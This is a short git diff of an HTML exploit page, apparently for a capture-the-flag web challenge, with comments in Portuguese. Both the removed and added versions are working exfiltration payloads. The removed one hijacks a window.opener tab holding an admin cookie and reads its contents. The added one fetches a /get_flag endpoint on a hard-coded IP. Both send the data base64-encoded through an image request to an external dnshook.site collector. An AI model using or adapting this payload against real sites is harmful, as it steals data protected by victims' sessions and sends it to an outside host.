@@ -1,26 +1,9 @@
-<!DOCTYPE html>
-<html>
-  <head><title>Exfiltrate Flag</title></head>
-  <body>
-    <script>
-      if (window.opener) {
-        // Redireciona a aba com cookie admin para /get_flag
-        window.opener.location = "http://34.134.162.213:17001/get_flag";
-
-        // Espera 1.5 segundos e tenta ler a flag da aba principal
-        setTimeout(() => {
-          try {
-            const flag = window.opener.document.body.innerText;
-            // Envia a flag via DNS exfiltration (funciona sempre!)
-            const i = new Image();
-            i.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/" + btoa(flag);
-          } catch (e) {
-            // Se falhar, exfiltra o erro para debug
-            const i = new Image();
-            i.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/erro_" + btoa(e.toString());
-          }
-        }, 1500);
-      }
-    </script>
-  </body>
-</html>
+<script>
+  // só para teste, ignora window.opener
+  fetch("http://34.134.162.213:17001/get_flag")
+    .then(r => r.text())
+    .then(flag => {
+      const i = new Image();
+      i.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/" + btoa(flag);
+    });
+</script>
